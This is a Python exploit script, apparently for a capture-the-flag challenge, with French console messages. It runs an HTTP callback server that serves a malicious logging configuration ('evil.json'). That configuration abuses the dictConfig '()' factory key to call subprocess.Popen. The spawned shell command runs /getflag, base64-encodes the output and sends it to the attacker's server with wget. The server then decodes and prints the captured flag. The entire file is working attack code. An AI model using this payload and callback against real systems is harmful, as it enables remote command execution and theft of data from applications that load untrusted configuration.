import base64
import http.server
import json
import threading
import urllib.parse

FLAG = None


def build_evil_json(attacker_ip, attacker_port):
    cmd = f"wget -qO- \"http://{attacker_ip}:{attacker_port}/flag?f=$(/getflag | base64 -w0)\""
    return {
        "version": 1,
        "disable_existing_loggers": False,
        "handlers": {
            "exfil": {
                "()": "subprocess.Popen",
                "args": ["sh", "-c", cmd],
            }
        },
        "root": {
            "level": "DEBUG",
            "handlers": ["exfil"],
        },
    }


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        global FLAG
        parsed = urllib.parse.urlparse(self.path)

        if parsed.path == "/evil.json":
            payload = build_evil_json(self.server.attacker_ip, self.server.attacker_port)
            body = json.dumps(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print("      [HTTP] evil.json servi")

        elif parsed.path == "/flag":
            params = urllib.parse.parse_qs(parsed.query)
            encoded = params.get("f", [""])[0]
            try:
                FLAG = base64.b64decode(encoded + "==").decode().strip()
            except Exception:
                FLAG = encoded
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            print(f"\n[+] FLAG recu : {FLAG}")

        else:
            self.send_response(404)
            self.end_headers()


def start_http_server(attacker_ip, port):
    server = http.server.HTTPServer(("0.0.0.0", port), CallbackHandler)
    server.attacker_ip = attacker_ip
    server.attacker_port = port
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[*] Serveur HTTP en ecoute sur :{port}")
    return server


if __name__ == "__main__":
    import argparse
    import signal
    import sys

    parser = argparse.ArgumentParser(description="Serveur HTTP callback — evil.json + flag")
    parser.add_argument("--ip",   default="0.0.0.0", help="IP d'ecoute (defaut: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=1337, help="Port d'ecoute (defaut: 1337)")
    args = parser.parse_args()

    server = start_http_server(args.ip, args.port)

    def _shutdown(sig, frame):
        print("\n[*] Arret du serveur.")
        server.shutdown()
        sys.exit(0)

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    print("[*] En attente de connexions (Ctrl+C pour arreter)...")
    signal.pause()